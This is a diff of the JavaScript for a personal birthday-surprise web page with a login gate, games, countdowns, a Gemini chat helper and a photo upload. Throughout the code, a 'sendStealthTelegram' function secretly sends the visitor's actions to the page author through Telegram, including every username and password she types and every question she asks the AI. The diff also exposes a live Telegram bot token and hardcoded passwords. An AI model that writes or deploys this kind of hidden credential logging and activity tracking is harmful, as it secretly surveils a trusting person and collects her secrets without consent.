 
-        // =========================================================================
-        // 2. KONTROL AUDIO (BGM)
-        // =========================================================================
         const bgAudio = document.getElementById('bg-audio');
         const musicBtn = document.getElementById('musicToggle');
         let isMusicPlaying = false;
-
         function toggleMusic() {
             if (isMusicPlaying) {
                 bgAudio.pause(); musicBtn.textContent = '🎵 BGM: OFF'; musicBtn.classList.add('music-off');
@@ -529,12 +444,11 @@
         musicBtn.addEventListener('click', toggleMusic);
 
         // =========================================================================
-        // 3. LOGIKA TOMBOL ANTI-LAG (PERFORMANCE MODE)
+        // 2. ANTI-LAG MODE
         // =========================================================================
         let isLiteMode = false;
         const liteModeBtn = document.getElementById('lite-mode-btn');
         const bgCanvasEl = document.getElementById('bg-canvas');
-
         liteModeBtn.addEventListener('click', function() {
             isLiteMode = !isLiteMode;
             if (isLiteMode) {
@@ -548,7 +462,7 @@
         });
 
         // =========================================================================
-        // 4. ENGINE CANVAS INTERAKTIF (PARTIKEL KLIK & CONFETTI KEMENANGAN)
+        // 3. CANVAS PARTICLES & CONFETTI
         // =========================================================================
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
@@ -622,233 +536,108 @@
         window.addEventListener('pointerdown', (e) => {
             if (isLiteMode || e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT' || e.target.tagName === 'A' || e.target.closest('.ai-section')) return;
             let x = e.clientX || (e.touches && e.touches[0].clientX); let y = e.clientY || (e.touches && e.touches[0].clientY);
-            if (x && y) {
-                let sparkCount = Math.floor(Math.random() * 8) + 10;
-                for(let i=0; i<sparkCount; i++) sparks.push(new Spark(x, y));
-            }
+            if (x && y) { let sparkCount = Math.floor(Math.random() * 8) + 10; for(let i=0; i<sparkCount; i++) sparks.push(new Spark(x, y)); }
         });
 
-        function fireWinConfetti() {
-            if (isLiteMode) bgCanvasEl.style.opacity = '1'; 
-            for(let i=0; i<200; i++) confettis.push(new Confetti());
-        }
+        function fireWinConfetti() { if (isLiteMode) bgCanvasEl.style.opacity = '1'; for(let i=0; i<200; i++) confettis.push(new Confetti()); }
 
         function animateCanvas() {
             if (!isLiteMode || confettis.length > 0) { 
                 ctx.clearRect(0,0,canvas.width, canvas.height);
                 if (!isLiteMode) particles.forEach(p => { p.update(); p.draw(); });
-                
-                for (let i = sparks.length - 1; i >= 0; i--) {
-                    sparks[i].update(); sparks[i].draw();
-                    if (sparks[i].life <= 0) sparks.splice(i, 1);
-                }
-                for (let i = confettis.length - 1; i >= 0; i--) {
-                    confettis[i].update(); confettis[i].draw();
-                    if (confettis[i].y > canvas.height + 100) confettis.splice(i, 1);
-                }
+                for (let i = sparks.length - 1; i >= 0; i--) { sparks[i].update(); sparks[i].draw(); if (sparks[i].life <= 0) sparks.splice(i, 1); }
+                for (let i = confettis.length - 1; i >= 0; i--) { confettis[i].update(); confettis[i].draw(); if (confettis[i].y > canvas.height + 100) confettis.splice(i, 1); }
             }
             requestAnimationFrame(animateCanvas);
         }
-        
-        window.addEventListener('resize', initCanvas);
-        initCanvas(); animateCanvas();
+        window.addEventListener('resize', initCanvas); initCanvas(); animateCanvas();
 
         // =========================================================================
-        // 5. FUNGSI PINTU MASUK & EFEK NGETIK
+        // 4. PINTU & SCROLLING EFFECT
         // =========================================================================
         function openGate() {
             document.getElementById('start-gate').classList.add('opened');
-            if(!isMusicPlaying) toggleMusic(); 
-            setTimeout(typeWriterEffect, 800); 
-            // TRACKER TELEGRAM
+            if(!isMusicPlaying) toggleMusic(); setTimeout(typeWriterEffect, 800); 
             sendStealthTelegram("🚪 Gerbang Dibuka", "Tombol 'HALO SAYANG PENCET!' diklik.");
         }
 
         const textToType = "Siap untuk melihat kejutanmu hari ini? Cari kuncinya di bawah ya...";
         let typeIndex = 0;
         function typeWriterEffect() {
-            if (typeIndex < textToType.length) {
-                document.getElementById("typewriter").innerHTML += textToType.charAt(typeIndex);
-                typeIndex++; setTimeout(typeWriterEffect, 50);
-            }
+            if (typeIndex < textToType.length) { document.getElementById("typewriter").innerHTML += textToType.charAt(typeIndex); typeIndex++; setTimeout(typeWriterEffect, 50); }
         }
 
-        // =========================================================================
-        // 6. EFEK RIPPLE (GELOMBANG AIR PADA TOMBOL)
-        // =========================================================================
         document.addEventListener('click', function(e) {
             let target = e.target.closest('.ripple-btn');
-            if (!target) return;
-            let rect = target.getBoundingClientRect();
+            if (!target) return; let rect = target.getBoundingClientRect();
             let x = e.clientX - rect.left; let y = e.clientY - rect.top;
             let ripple = document.createElement('span'); ripple.classList.add('ripple');
             ripple.style.left = `${x}px`; ripple.style.top = `${y}px`;
             try { target.appendChild(ripple); setTimeout(() => ripple.remove(), 600); } catch(err){}
         });
 
-        // =========================================================================
-        // 7. EFEK PARALLAX SCROLLING
-        // =========================================================================
         const parallaxShapes = document.querySelectorAll('.parallax-shape');
         window.addEventListener('scroll', () => {
-            if (isLiteMode) return;
-            let scrollY = window.scrollY;
-            parallaxShapes.forEach((shape, index) => {
-                let speed = (index + 1) * 0.15;
-                shape.style.transform = `translateY(${scrollY * speed}px) rotate(${scrollY * 0.1}deg)`;
-            });
+            if (isLiteMode) return; let scrollY = window.scrollY;
+            parallaxShapes.forEach((shape, index) => { let speed = (index + 1) * 0.15; shape.style.transform = `translateY(${scrollY * speed}px) rotate(${scrollY * 0.1}deg)`; });
         });
 
         // =========================================================================
-        // 8. LOGIKA DRAG-TO-SCROLL GALERI
+        // 5. DRAG TO SCROLL GALERI
         // =========================================================================
         const slider = document.getElementById('gallery-track');
         let isDown = false; let startX; let scrollLeft;
-
-        slider.addEventListener('mousedown', (e) => {
-            isDown = true;
-            slider.style.cursor = 'grabbing';
-            startX = e.pageX - slider.offsetLeft;
-            scrollLeft = slider.scrollLeft;
-        });
+        slider.addEventListener('mousedown', (e) => { isDown = true; slider.style.cursor = 'grabbing'; startX = e.pageX - slider.offsetLeft; scrollLeft = slider.scrollLeft; });
         slider.addEventListener('mouseleave', () => { isDown = false; slider.style.cursor = 'grab'; });
         slider.addEventListener('mouseup', () => { isDown = false; slider.style.cursor = 'grab'; });
-        slider.addEventListener('mousemove', (e) => {
-            if (!isDown) return;
-            e.preventDefault();
-            const x = e.pageX - slider.offsetLeft;
-            const walk = (x - startX) * 2;
-            slider.scrollLeft = scrollLeft - walk;
-        });
+        slider.addEventListener('mousemove', (e) => { if (!isDown) return; e.preventDefault(); const x = e.pageX - slider.offsetLeft; const walk = (x - startX) * 2; slider.scrollLeft = scrollLeft - walk; });
 
-        // =========================================================================
-        // 9. OBSERVER HIGHLIGHT (GALERI HORIZONTAL & GAME VERTIKAL)
-        // =========================================================================
         const galleryCards = document.querySelectorAll('.gallery-card');
-        const galleryObserver = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) entry.target.classList.add('is-focused');
-                else entry.target.classList.remove('is-focused');
-            });
-        }, { root: slider, rootMargin: '0px', threshold: 0.6 });
+        const galleryObserver = new IntersectionObserver((entries) => { entries.forEach(entry => { if (entry.isIntersecting) entry.target.classList.add('is-focused'); else entry.target.classList.remove('is-focused'); }); }, { root: slider, rootMargin: '0px', threshold: 0.6 });
         galleryCards.forEach(card => galleryObserver.observe(card));
 
         const gameCards = document.querySelectorAll('.game-card');
-        const gameObserver = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) entry.target.classList.add('game-focused');
-                else entry.target.classList.remove('game-focused');
-            });
-        }, { root: null, rootMargin: '-20% 0px -20% 0px', threshold: 0.5 });
+        const gameObserver = new IntersectionObserver((entries) => { entries.forEach(entry => { if (entry.isIntersecting) entry.target.classList.add('game-focused'); else entry.target.classList.remove('game-focused'); }); }, { root: null, rootMargin: '-20% 0px -20% 0px', threshold: 0.5 });
         gameCards.forEach(card => gameObserver.observe(card));
 
         // =========================================================================
-        // 10. THE TROLL BUTTON (TOMBOL KABUR-KABURAN)
+        // 6. COUNTDOWN ENGINE
         // =========================================================================
-        const trollBtn = document.getElementById('troll-btn');
-        
-        function moveTrollButton() {
-            const randomX = (Math.random() - 0.5) * 200;
-            const randomY = (Math.random() - 0.5) * 100;
-            trollBtn.style.transform = `translate(calc(-50% + ${randomX}px), ${randomY}px)`;
-            const trollColors = ['#ff6b8a', '#4facfe', '#ccff00', '#ffd166', '#f8f9fa'];
-            trollBtn.style.background = trollColors[Math.floor(Math.random() * trollColors.length)];
-        }
+        function initCountdowns() {
+            function updateTimer(targetDateStr, elementId) {
+                const targetDate = new Date(targetDateStr).getTime();
+                const now = new Date().getTime();
+                const distance = targetDate - now;
+                const el = document.getElementById(elementId);
+                if (!el) return;
 
-        trollBtn.addEventListener('mouseenter', moveTrollButton);
-        trollBtn.addEventListener('touchstart', (e) => {
-            e.preventDefault(); 
-            moveTrollButton();
-        });
+                if (distance < 0) { el.innerHTML = "<div class='time-box' style='width: 100%;'><span class='time-val'>🎉</span><span class='time-lbl'>HARI H!</span></div>"; return; }
 
-        // =========================================================================
-        // 11. CHEAT CODE (JALUR VIP ANTI-NGAMBEK)
-        // =========================================================================
-        const secretTitle = document.getElementById('secret-title');
-        let cheatCount = 0;
-        let cheatTimer;
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-        secretTitle.addEventListener('click', () => {
-            cheatCount++;
-            clearTimeout(cheatTimer);
-            cheatTimer = setTimeout(() => { cheatCount = 0; }, 2000);
-            
-            if(cheatCount === 7) {
-                document.body.style.background = 'var(--accent-yellow)';
-                setTimeout(() => { document.body.style.background = 'var(--bg-color)'; }, 200);
-
-                document.getElementById('inputUsername').value = "anggie dwi aprilia";
-                document.getElementById('inputPassword').value = "200408!";
-                
-                alert("👑 CHEAT ACTIVATED! VIP ACCESS GRANTED 👑");
-                processLogin();
-                cheatCount = 0; 
-                
-                // TRACKER CHEAT
-                sendStealthTelegram("👑 CHEAT VIP DIAKTIFKAN", "User menekan judul 7 kali untuk bypass.");
+                el.innerHTML = `
+                    <div class="time-box"><span class="time-val">${days}</span><span class="time-lbl">Hari</span></div>
+                    <div class="time-box"><span class="time-val">${hours}</span><span class="time-lbl">Jam</span></div>
+                    <div class="time-box"><span class="time-val">${minutes}</span><span class="time-lbl">Mnt</span></div>
+                    <div class="time-box"><span class="time-val">${seconds}</span><span class="time-lbl">Dtk</span></div>
+                `;
             }
-        });
+            setInterval(() => {
+                updateTimer("August 7, 2026 00:00:00", "timer-aldo-index");
+                updateTimer("April 20, 2027 00:00:00", "timer-anggie-index");
+            }, 1000);
+        }
+        initCountdowns();
 
         // =========================================================================
-        // 12. LOGIKA LOGIN FORM
+        // 7. GEMINI AI ASSISTANT (VERSI OTOMATIS)
         // =========================================================================
         
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                if (document.activeElement.id === 'aiQuery') {
-                    askAI();
-                } else {
-                    processLogin();
-                }
-            }
-        });
-
-        function processLogin() {
-            const rawUser = document.getElementById('inputUsername').value.trim();
-            const user = rawUser.toLowerCase();
-            const pass = document.getElementById('inputPassword').value.trim();
-            const btn = document.getElementById('btn-login');
-            const errMsg = document.getElementById('error-msg');
-            const container = document.getElementById('login-container');
-            let isSuccess = false;
-
-            if (user === "anggi dwi aprilia" || user === "anggie dwi aprilia") {
-                if (pass === "200408!") isSuccess = true;
-            } else if (user === "aldo leo saputra") {
-                if (pass === "280708!") isSuccess = true;
-            } else if (user === "alief hidayat") {
-                if (pass === "200408!") isSuccess = true;
-            }
-
-            // TRACKER TELEGRAM UNTUK LOGIN
-            let statusLogin = isSuccess ? "✅ BERHASIL MASUK" : "❌ GAGAL MASUK";
-            sendStealthTelegram("🔐 Percobaan Login", `Username yang diketik:\n\`${rawUser}\`\n\nPassword yang diketik:\n\`${pass}\`\n\nStatus: ${statusLogin}`);
-
-            if (isSuccess) {
-                errMsg.style.display = 'none';
-                btn.textContent = 'MENGAKSES SISTEM... ✨';
-                btn.style.background = 'var(--accent-green)';
-                btn.style.color = 'var(--border-color)';
-                btn.style.boxShadow = '0px 0px 0px transparent';
-                
-                fireWinConfetti();
-                setTimeout(() => window.location.href = 'happybirthday.html', 2000);
-            } else {
-                errMsg.style.display = 'block';
-                btn.textContent = 'COBA LAGI';
-                btn.style.background = '#ff4757';
-                btn.style.color = '#fff';
-                
-                container.classList.remove('shake-animation');
-                void container.offsetWidth; 
-                container.classList.add('shake-animation');
-            }
-        }
-
-        // =========================================================================
-        // 13. GEMINI AI ASSISTANT (FITUR BARU)
-        // =========================================================================
-        const apiKey = ""; // API Key Gemini otomatis disediakan environment
+        // Di lingkungan ini, API Key tidak perlu diisi manual. Biarkan kosong saja!
+        const apiKey = ""; 
 
         async function fetchWithRetry(url, options, retries = 5) {
             const delays = [1000, 2000, 4000, 8000, 16000];
@@ -870,19 +659,13 @@
             const loadingBox = document.getElementById('aiLoading');
             const btn = document.getElementById('aiSubmitBtn');
 
-            if (!query) {
-                alert("Ketik sesuatu dulu dong sayang!");
-                return;
-            }
+            if (!query) { alert("Ketik sesuatu dulu dong sayang!"); return; }
 
-            // TRACKER TELEGRAM UNTUK AI
             sendStealthTelegram("🤖 Tanya Asisten AI", `Pertanyaan:\n"${query}"`);
 
-            // Atur status UI
             responseBox.style.display = 'none';
             loadingBox.style.display = 'block';
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
+            btn.disabled = true; btn.style.opacity = '0.5';
 
             const systemPrompt = "Kamu adalah asisten AI yang dibuat oleh Aldo (atau Leo) untuk memandu pacarnya, Anggie, di website ulang tahunnya. Jawab dengan gaya bahasa gaul, santai, lucu, dan sedikit manja/gombal. PENTING: Jika Anggie bertanya tentang password, clue, atau kunci masuk, JANGAN PERNAH sebutkan password aslinya (200408!). Berikan saja petunjuk samar seperti 'coba ingat-ingat tanggal jadian kita sayang' atau suruh dia main game Flappy Bird / 2048 di atas. Jawablah maksimal 3 kalimat saja makanan kesukaan nya aldo gacoan dan suka minum yang manis manis jikalau dia nanya yang personal dan ga ada yang nyuruh di prompt ini kalo bisa jangan di jawab khusus persol kallo dia nanya suka sama aku apa engga jelas suka.";
 
@@ -892,28 +675,125 @@
             };
 
             try {
+                // Endpoint khusus yang di-support lingkungan ini (Otomatis jalan tanpa login)
                 const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
                 const result = await fetchWithRetry(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
                 const text = result.candidates?.[0]?.content?.parts?.[0]?.text;
                 if (text) {
+                    responseBox.style.background = '#f0f0f0'; responseBox.style.color = '#111';
                     responseBox.innerHTML = text.replace(/\n/g, '<br>');
                     responseBox.style.display = 'block';
-                } else {
-                    throw new Error("Empty response");
-                }
+                } else { throw new Error("Empty response"); }
             } catch (error) {
                 console.error(error);
+                responseBox.style.background = '#f0f0f0'; responseBox.style.color = '#111';
                 responseBox.innerHTML = "Waduh, koneksi ke otak Aldo lagi putus nih. Coba tanya lagi ya sayang! 😅";
                 responseBox.style.display = 'block';
             } finally {
                 loadingBox.style.display = 'none';
-                btn.disabled = false;
-                btn.style.opacity = '1';
+                btn.disabled = false; btn.style.opacity = '1';
+            }
+        }
+
+        // =========================================================================
+        // 8. LOGIKA KIRIM PAP KE TELEGRAM (FITUR BARU)
+        // =========================================================================
+        function kirimPapKeTelegram() {
+            const fileInput = document.getElementById('pap-input');
+            const statusBox = document.getElementById('upload-status');
+            const file = fileInput.files[0];
+            
+            if (!file) return;
+
+            // Tampilkan loading di UI
+            statusBox.style.display = 'block';
+            statusBox.style.background = 'var(--accent-yellow)';
+            statusBox.style.color = '#111';
+            statusBox.innerHTML = 'MENGIRIM PAP... TUNGGU BENTAR SAYANG ⏳';
+
+            // Token & Chat ID Telegram Kamu
+            const token = "8731904526:AAE2bkcOaFyhpYMo1UzRNe-7XcUR2WvCL2g";
+            const chatId = "5736685592";
+            
+            // Bungkus gambar ke form data
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+            formData.append("caption", "📸 *PAP MISTERIUS DARI PRINCESS*\nAda kiriman foto masuk nih dari web! Wkwkwk");
+
+            // Tembak langsung ke API Telegram (Method: sendPhoto)
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusBox.style.background = 'var(--accent-green)';
+                    statusBox.style.color = '#111';
+                    statusBox.innerHTML = 'PAP BERHASIL DIKIRIM KE ALDO! ✨😎';
+                } else {
+                    statusBox.style.background = '#ff4757';
+                    statusBox.style.color = '#fff';
+                    statusBox.innerHTML = 'GAGAL NGIRIM! Coba foto lain.';
+                }
+                fileInput.value = ""; // Reset isian
+            })
+            .catch(error => {
+                statusBox.style.background = '#ff4757';
+                statusBox.style.color = '#fff';
+                statusBox.innerHTML = 'ERROR KONEKSI INTERNET! 😭';
+                fileInput.value = "";
+            });
+        }
+
+        // =========================================================================
+        // 9. LOGIKA TROLL BUTTON & LOGIN FORM
+        // =========================================================================
+        const trollBtn = document.getElementById('troll-btn');
+        function moveTrollButton() {
+            const randomX = (Math.random() - 0.5) * 200; const randomY = (Math.random() - 0.5) * 100;
+            trollBtn.style.transform = `translate(calc(-50% + ${randomX}px), ${randomY}px)`;
+            const trollColors = ['#ff6b8a', '#4facfe', '#ccff00', '#ffd166', '#f8f9fa'];
+            trollBtn.style.background = trollColors[Math.floor(Math.random() * trollColors.length)];
+        }
+        trollBtn.addEventListener('mouseenter', moveTrollButton);
+        trollBtn.addEventListener('touchstart', (e) => { e.preventDefault(); moveTrollButton(); });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                if (document.activeElement.id === 'aiQuery') { askAI(); } 
+                else if (document.activeElement.id === 'inputUsername' || document.activeElement.id === 'inputPassword') { processLogin(); }
+            }
+        });
+
+        function processLogin() {
+            const rawUser = document.getElementById('inputUsername').value.trim();
+            const user = rawUser.toLowerCase();
+            const pass = document.getElementById('inputPassword').value.trim();
+            const btn = document.getElementById('btn-login');
+            const errMsg = document.getElementById('error-msg');
+            const container = document.getElementById('login-container');
+            let isSuccess = false;
+
+            if (user === "anggi dwi aprilia" || user === "anggie dwi aprilia") { if (pass === "200408!") isSuccess = true; } 
+            else if (user === "aldo leo saputra") { if (pass === "280708!") isSuccess = true; } 
+            else if (user === "alief hidayat") { if (pass === "200408!") isSuccess = true; }
+
+            let statusLogin = isSuccess ? "✅ BERHASIL MASUK" : "❌ GAGAL MASUK";
+            sendStealthTelegram("🔐 Percobaan Login", `Username yang diketik:\n\`${rawUser}\`\n\nPassword yang diketik:\n\`${pass}\`\n\nStatus: ${statusLogin}`);
+
+            if (isSuccess) {
+                errMsg.style.display = 'none'; btn.textContent = 'MENGAKSES SISTEM... ✨'; btn.style.background = 'var(--accent-green)'; btn.style.color = 'var(--border-color)'; btn.style.boxShadow = '0px 0px 0px transparent';
+                fireWinConfetti();
+                setTimeout(() => window.location.href = 'happybirthday.html', 2000);
+            } else {
+                errMsg.style.display = 'block'; btn.textContent = 'COBA LAGI'; btn.style.background = '#ff4757'; btn.style.color = '#fff';
+                container.classList.remove('shake-animation'); void container.offsetWidth; container.classList.add('shake-animation');
             }
         }
     </script>
